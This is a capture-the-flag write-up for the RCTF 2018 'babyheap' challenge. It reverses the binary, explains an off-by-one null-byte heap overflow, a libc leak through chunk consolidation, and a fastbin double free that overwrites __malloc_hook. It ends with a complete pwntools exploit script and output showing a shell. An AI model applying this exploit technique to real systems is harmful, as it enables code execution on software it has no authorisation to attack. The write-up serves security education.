# babyheap

This writeup is based off of this other writeups: https://twisted-fun.github.io/2018-05-24-RCTF18-PWN-317/ https://github.com/sajjadium/ctf-writeups/tree/master/RCTF/2018/babyheap

Let's take a look at the binary and shared object file we were given:
```
$	file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=220fd4e3e91c4ef2413cc0a4c222a0548602662e, stripped
$	file libc.so.6 
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5381a457906d279073822a5ceb24c4bfef94ddb, for GNU/Linux 2.6.32, stripped
$	./babyheap 
1. Alloc
2. Show
3. Delete
4. Exit
choice: 1
please input chunk size: 20
input chunk content: 15935728
1. Alloc
2. Show
3. Delete
4. Exit
choice: 2
please input chunk index: 0
content: 15935728
1. Alloc
2. Show
3. Delete
4. Exit
choice: 3
please input chunk index: 0
1. Alloc
2. Show
3. Delete
4. Exit
choice: 4
```

So we can see that we have a 64 bit binary and shared object file (which is libc). When we run the binary, we see we are given four options. The first is to allocate more space and store a string in there (we decide the size of the space). We can print allocated space. In addition to that we can also delete allocated space. Lastly we can exit. With that let's reverse the functions:

## Reversing

##### Main
```
void __fastcall __noreturn main(const char *a1, char **a2, char **a3)
{
  int v3; // eax@2
  int menu_option; // [sp+1Ch] [bp-4h]@3

  sub_F4B();
  if ( (signed int)a1 > 1 )
  {
    v3 = atoi(a2[1]);
    a1 = (const char *)(unsigned int)v3;
    alarm(v3);
  }
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      menu_option = prompt_input();
      if ( menu_option != 1 )
        break;
      allocate((__int64)a1, (__int64)a2);
    }
    if ( menu_option == 2 )
    {
      show((__int64)a1, (__int64)a2);
    }
    else if ( menu_option == 3 )
    {
      delete((__int64)a1, (__int64)a2);
    }
    else
    {
      if ( menu_option == 4 )
        exit(0);
      a1 = "wrong choice";
      puts("wrong choice");
    }
  }
}
```

##### Allocate

```
void *__fastcall allocate(__int64 a1, __int64 a2)
{
  void *result; // rax@14
  unsigned __int64 i; // [sp+8h] [bp-18h]@8
  signed __int64 nmemb; // [sp+10h] [bp-10h]@3
  void *allocated_memory_ptr; // [sp+18h] [bp-8h]@6

  if ( allocated_space_pointer_index > 0x20u )
    custom_print_error((__int64)"too many chunk");
  printf("please input chunk size: ", a2);
  nmemb = prompt_input();
  if ( nmemb <= 0 || nmemb > 256 )
    custom_print_error((__int64)"invalid size");
  allocated_memory_ptr = calloc(nmemb, 1uLL);
  if ( !allocated_memory_ptr )
    custom_print_error((__int64)"memory error");
  printf("input chunk content: ", 1LL);
  allocate_space((__int64)allocated_memory_ptr, nmemb);
  for ( i = 0LL; i <= 0x1F && *(_QWORD *)(8 * i + allocated_space_pointer_array); ++i )
    ;
  if ( i == 32 )
    custom_print_error((__int64)"too many chunk");
  *(_QWORD *)(allocated_space_pointer_array + 8 * i) = allocated_memory_ptr;
  result = &allocated_space_pointer_index;
  ++allocated_space_pointer_index;
  return result;
}
```

##### Show

```
int __fastcall show(__int64 a1, __int64 a2)
{
  int result; // eax@5
  int index; // [sp+4h] [bp-Ch]@1
  __int64 memory_to_be_printed; // [sp+8h] [bp-8h]@4

  printf("please input chunk index: ", a2);
  index = prompt_input();
  if ( index < 0 || index > 31 )
    custom_print_error((__int64)"invalid index");
  memory_to_be_printed = *(_QWORD *)(8LL * index + allocated_space_pointer_array);
  if ( memory_to_be_printed )
    result = printf("content: %s\n", memory_to_be_printed);
  else
    result = puts("no such a chunk");
  return result;
}
```

##### Delete
```
_QWORD *__fastcall delete(__int64 a1, __int64 a2)
{
  signed __int64 bytes_index; // rdx@4
  _QWORD *result; // rax@4
  int index; // [sp+4h] [bp-Ch]@1
  void *ptr; // [sp+8h] [bp-8h]@4

  printf("please input chunk index: ", a2);
  index = prompt_input();
  if ( index < 0 || index > 31 )
    custom_print_error((__int64)"invalid index");
  bytes_index = 8LL * index;
  result = *(_QWORD **)(bytes_index + allocated_space_pointer_array);
  ptr = *(void **)(bytes_index + allocated_space_pointer_array);
  if ( ptr )
  {
    --allocated_space_pointer_index;
    free(ptr);
    result = (_QWORD *)(8LL * index + allocated_space_pointer_array);
    *result = 0LL;
  }
  return result;
}
```

##### Allocate Space

```
__int64 __fastcall allocate_space(__int64 ptr, unsigned int number_of_bytes)
{
  char buf; // [sp+13h] [bp-Dh]@2
  unsigned int i; // [sp+14h] [bp-Ch]@1
  __int64 stack_canary; // [sp+18h] [bp-8h]@1

  stack_canary = *MK_FP(__FS__, 40LL);
  for ( i = 0; i < number_of_bytes; ++i )
  {
    buf = 0;
    if ( read(0, &buf, 1uLL) < 0 )
      custom_print_error((__int64)"read() error");
    *(_BYTE *)(ptr + i) = buf;
    if ( buf == 10 )
      break;
  }
  *(_BYTE *)(i + ptr) = 0;
  return *MK_FP(__FS__, 40LL) ^ stack_canary;
}
```

We can also see that there is a bug:

```
  *(_BYTE *)(i + ptr) = 0;
```

This is a piece of code that there is supposed to null terminate the data. However it will write a null byte after our input. So effectively this gives us a one null byte overflow. Below you can see the bug in action, with the space that the zero is being written to is after our input, and that data there is indeed overwritten:

```
gdb-peda$ b *0x555555554c4b
Breakpoint 1 at 0x555555554c4b
gdb-peda$ r
Starting program: /Hackery/RCTF/babyheap/babyheap 
1. Alloc
2. Show
3. Delete
4. Exit
choice: 1
please input chunk size: 5
input chunk content: 15935

[----------------------------------registers-----------------------------------]
RAX: 0x555555766b65 --> 0x0 
RBX: 0x0 
RCX: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x5 
RSI: 0x7fffffffdee3 --> 0x94b3000000000535 
RDI: 0x0 
RBP: 0x7fffffffdef0 --> 0x7fffffffdf20 --> 0x7fffffffdf50 --> 0x5555555551f0 (push   r15)
RSP: 0x7fffffffded0 --> 0x500000000 
RIP: 0x555555554c4b (mov    BYTE PTR [rax],0x0)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x15 
R10: 0x7ffff7dd1b58 --> 0x555555766b70 --> 0x0 
R11: 0x246 
R12: 0x555555554a60 (xor    ebp,ebp)
R13: 0x7fffffffe030 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554c41:	mov    edx,DWORD PTR [rbp-0xc]
   0x555555554c44:	mov    rax,QWORD PTR [rbp-0x18]
   0x555555554c48:	add    rax,rdx
=> 0x555555554c4b:	mov    BYTE PTR [rax],0x0
   0x555555554c4e:	nop
   0x555555554c4f:	mov    rax,QWORD PTR [rbp-0x8]
   0x555555554c53:	xor    rax,QWORD PTR fs:0x28
   0x555555554c5c:	je     0x555555554c63
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffded0 --> 0x500000000 
0008| 0x7fffffffded8 --> 0x555555766b60 --> 0x3533393531 ('15935')
0016| 0x7fffffffdee0 --> 0x535554a60 
0024| 0x7fffffffdee8 --> 0xab55fb2f0894b300 
0032| 0x7fffffffdef0 --> 0x7fffffffdf20 --> 0x7fffffffdf50 --> 0x5555555551f0 (push   r15)
0040| 0x7fffffffdef8 --> 0x555555554d7f (mov    QWORD PTR [rbp-0x18],0x0)
0048| 0x7fffffffdf00 --> 0x0 
0056| 0x7fffffffdf08 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555554c4b in ?? ()
gdb-peda$ 
gdb-peda$ x/x $rax
0x555555766b65:	0x0000000000000000
gdb-peda$ x/x $rax-0x5
0x555555766b60:	0x0000003533393531
gdb-peda$ x/s $rax-0x5
0x555555766b60:	"15935"
gdb-peda$ set *0x555555766b65 = 0xff
gdb-peda$ x/x $rax
0x555555766b65:	0xff
gdb-peda$ si










[----------------------------------registers-----------------------------------]
RAX: 0x555555766b65 --> 0x0 
RBX: 0x0 
RCX: 0x7ffff7b08890 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x5 
RSI: 0x7fffffffdee3 --> 0x94b3000000000535 
RDI: 0x0 
RBP: 0x7fffffffdef0 --> 0x7fffffffdf20 --> 0x7fffffffdf50 --> 0x5555555551f0 (push   r15)
RSP: 0x7fffffffded0 --> 0x500000000 
RIP: 0x555555554c4e (nop)
R8 : 0x7ffff7fd1700 (0x00007ffff7fd1700)
R9 : 0x15 
R10: 0x7ffff7dd1b58 --> 0x555555766b70 --> 0x0 
R11: 0x246 
R12: 0x555555554a60 (xor    ebp,ebp)
R13: 0x7fffffffe030 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554c44:	mov    rax,QWORD PTR [rbp-0x18]
   0x555555554c48:	add    rax,rdx
   0x555555554c4b:	mov    BYTE PTR [rax],0x0
=> 0x555555554c4e:	nop
   0x555555554c4f:	mov    rax,QWORD PTR [rbp-0x8]
   0x555555554c53:	xor    rax,QWORD PTR fs:0x28
   0x555555554c5c:	je     0x555555554c63
   0x555555554c5e:	call   0x5555555549e0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffded0 --> 0x500000000 
0008| 0x7fffffffded8 --> 0x555555766b60 --> 0x3533393531 ('15935')
0016| 0x7fffffffdee0 --> 0x535554a60 
0024| 0x7fffffffdee8 --> 0xab55fb2f0894b300 
0032| 0x7fffffffdef0 --> 0x7fffffffdf20 --> 0x7fffffffdf50 --> 0x5555555551f0 (push   r15)
0040| 0x7fffffffdef8 --> 0x555555554d7f (mov    QWORD PTR [rbp-0x18],0x0)
0048| 0x7fffffffdf00 --> 0x0 
0056| 0x7fffffffdf08 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000555555554c4e in ?? ()
gdb-peda$ x/x $rax
0x555555766b65:	0x0000000000000000
``` 

## Exploiting

This exploit deals with bins, consolodating chunks, and a lot of other intersting things. You can find information about those things either in one of the writeups this is based off of, or https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html

#### Infoleak High Level look
First we will need to get an info leak to do the second part of the attack

This might seem like a unimportant exploit, but it would allow us to leak a libc address and break aslr. For more info on this particular type of attack (and a lot of other heap attacks) visit: 

First we will allocate four chunks of memory:

```
0xf0:	chunk 0
0x70:	chunk 1
0xf0:	chunk 2
0x30:	chunk 3
```

These four chunks will be needed to do this attack, Proceeding that we will free chunks 1 and 2:

```
0xf0:	freed 
0x70:	freed
0xf0:	chunk 2
0x30:	chunk 3
```

Those two freed chunks will give us the space we need to do the next step. Proceeding that we will allocate 0x78 bytes of space, which will start where chunk 1 used to be. This will fill up the entire space that chunk 1 held, overflow the previous size value in the header of chunk 2 to 384 (reason for that being is that is the size of the old chunk 0 and 1), and the null byte will se the previous chunk in use bit to zero.

```
0xf0:	freed
0x70:	chunk 1 overflow chunk
0xf0:	chunk 2 prev_size to 0x180, in use bit set to 0x0
0x30:	chunk 3 
```

Next we will free chunk 2. Due to the increase of chunk 2's previous chunk size we overflowed, and the previous chunk in use bit we overwrote to false, it will move the wilderness up to where chunk 0 used to be. Thus it effictively forgot about chunk 2, and we can overwrite it with another heap allocation:

```
0xf0:	freed
0x70:	chunk 0 overflow chunk
0xf0:	freed, chunk consolidates where chunk 0 was
0x30:	chunk 3 
```

Next we will allocate heap space which we will use to push a libc address to the content section of chunk 1.

```
0xf0:	chunk 1 overflows chunk 0
0x70:	chunk 0 overflow chunk
0xf0:	freed, chunk consolidated where chunk 0 is
0x30:	chunk 3 
```

After that happens, we can effictively just print chunk 0, and it will leak the libc address. With that we can break aslr in libc, and know every libc address.

#### Code Execution

Now that we have an infoleak, we can get code execution. We can do this by writing over a malloc hook with somehting that will get us a shell, that way when the function `calloc` is called we will get a shell. The specific value we are overwriting will be at offset `0x4526a` in the libc file they gave us. We are jumping in the middle of a program which will make a syscall to get us a shell (a nice little thing the challenge author made for us):

0x4526a:
```
mov     rax, cs:environ_ptr_0
lea     rdi, aBinSh     ; "/bin/sh"
lea     rsi, [rsp+188h+var_158]
mov     cs:dword_3C64A0, 0
mov     cs:dword_3C64A4, 0
mov     rdx, [rax]
call    execve
``` 

To do this we can get malloc to return a pointer to the same region of memory twice. The first time it returns an address to a region of memory, we can write an address to a region of memory there (effictively create a fake chunk). With the second pointer to the same memrory region, that fake chunk will get added to the list of free fastbins. Proceeding that we can then allocate that chunk and write to that region of memory.

In order to do this, we will target the address of `__malloc_hook - 0x23`, reason for it being that we need to have metadata that is in the fastbin limit, which for us is 0x7f.  

In order to have malloc return a pointer to the same region of memory twice, we will need to free the same chunk twice so it is added to the list of available bins twice. In order to do this, we will need to overlap a chunk with another chunk. We can use the overlapped chunk `0` from the info leak to do this. Essentially what we will do is first free chunk `1` from the earlier info leak, then we will allocate four chunks of memory, one of size `0x10` and the rest `0x60` bytes large. The reason for this being is that for this attack we need three chunks of the same size in order for this attack to work (and the `0x10` chunk is to help with formatting). The third and final `0x60` chunk will overlap with the overlapped chunk `0`. With that our chunks will look like this:

```
0x10:	chunk 1
0x60:	chunk 2
0x60:	chunk 4
0x60:	chunk 5 which directly overlaps with the next chunk
0x70:	chunk 0 which is at the same place in memory as chunk 5
```

After that we can just free chunks `5`, `4`, and `0` (we need it in that order for this to work), we would have effectively freed the same address twice. Proceeding that we can allocate three additional chunks of memory (all of size `0x60`) with the first one starting with the address of our fake chunk to `__malloc_hook` and we will get our fake chunk added to the free list. Proceeding that we can just allocate another chunk, and write to the `__malloc_hook`.

#### Exploit

Above I talked about the concepts of how the exploit works. Here is the actual code for the exploit:
```
#This exploit is based off of: https://twisted-fun.github.io/2018-05-24-RCTF18-PWN-317/

#Import pwntools
from pwn import *

#Establish the three functions needed to interface with the target
def alloc(size, content):
	target.recvuntil("choice: ")
	target.sendline('1')
	target.recvuntil("please input chunk size: ")
	target.sendline(str(size))
	target.recvuntil("input chunk content: ")
	target.sendline(content)

def show(index):
	target.recvuntil("choice: ")
	target.sendline('2')
	target.recvuntil("please input chunk index: ")	
	target.sendline(str(index))

def delete(index):
	target.recvuntil("choice: ")
	target.sendline('3')
	target.recvuntil("please input chunk index: ")
	target.sendline(str(index))

#Establish the target, enviornment, and the libc file associated
target = process('./babyheap', env={"LD_PRELOAD":"./libc.so.6"})
elf = ELF('./libc.so.6')
gdb.attach(target)

#Allocate the first four chunks
alloc(0xf0, '0'*0xf0)# Chunk 0
alloc(0x70, '1'*0x70)# Chunk 1
alloc(0xf0, '2'*0xf0)# Chunk 2
alloc(0x30, '3'*0x30)# Chunk3

#Free the first two chunks to setup for the overflow and chunk consolidation
delete(0)# Chunk 0 is now freed
delete(1)# Chunk 1 is now freed

#Allocate a new chunk where chunk 1 used to be, to overflow chunk 2's prev_size with 0x180 and prev in use bit to 0x0 to allow for the chunk consolidation
alloc(0x78, '4'*0x70 + p64(0x180))# Chunk 0

#Free chunk 2, which will consolidate with chunk 0, thus start allocating space before chunk 0 and allowing us to overflow it
delete(2)

#allocate space to push a libc address into the content section for Chunk 0
alloc(0xf0, '5'*0xf0)# Chunk 1

#Print the contents of chunk 0, which will leak a libc address. Filter it out and calculate the other addresses needed
show(0)
print target.recvuntil("content: ")
leak = u64(target.recv(6) + "\x00\x00")
libc = leak - elf.symbols['__malloc_hook'] - 0x68
fake_chunk = libc + elf.symbols['__malloc_hook'] - 0x23
oneshot = libc + 0x4526a
log.info("Leak is:   " + hex(leak))
log.info("Libc is:   " + hex(libc))
log.info("Chunk is:  " + hex(fake_chunk))
log.info("System is: " + hex(oneshot))

#Free chunk 1 to make space fot he new chunks
delete(1)

#Allocate the other chunks to be freed, which will lead to the double free
alloc(0x10, '6'*0x10)# Chunk 1
alloc(0x60, '7'*0x60)# Chunk 1
alloc(0x60, '8'*0x60)# Chunk 4
alloc(0x60, '9'*0x60)# Chunk 5, directly overlaps with Chunk 0

#Free chunks 5, 4, and 0, to free the same address (5 & 0) twice
delete(5)
delete(4)
delete(0)


#Allocate three spaces and get our fake chunk added to the list of free chunks 
alloc(0x60, p64(fake_chunk) + p64(0) + 'w'*0x50)
alloc(0x60, 'x'*0x60)
alloc(0x60, 'y'*0x60)

#Allocate new space to write over the malloc hook
alloc(0x60, 'z'*0x13 + p64(oneshot) + "\n")

#Just have the code call calloc again to get rce
target.sendlineafter("choice: ", "1")
target.sendlineafter(": ", "1")

#Drop to an interactive shell to use the shell
target.interactive()

#This exploit is based off of: https://twisted-fun.github.io/2018-05-24-RCTF18-PWN-317/
```

When we run it:
```
$	python exploit.py 
[+] Starting local process './babyheap': pid 7013
[*] '/Hackery/RCTF/babyheap/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] running in new terminal: /usr/bin/gdb -q  "/Hackery/RCTF/babyheap/babyheap" 7013
[+] Waiting for debugger: Done
content: 
[*] Leak is:   0x7fa3a2dd5b78
[*] Libc is:   0x7fa3a2a11000
[*] Chunk is:  0x7fa3a2dd5aed
[*] System is: 0x7fa3a2a5626a
[*] Switching to interactive mode
please input chunk size: $ w
 02:22:43 up  5:36,  1 user,  load average: 1.46, 1.50, 1.29
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               20:47    5:35m 11:23   0.04s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ ls
1  babyheap                      peda-session-dash.txt
2  babyheap_38af156349af04e8f6dc22a0ffee6a7a.zip  peda-session-libc.so.6.txt
3  core                          peda-session-w.procps.txt
4  exploit.py                      readme.md
5  libc.so.6                      solved.py
6  peda-session-babyheap.txt
$  
```

Just like that, we popped a shell. I would also like to say thanks to the writeups mentioned earlier, that this is based off of.
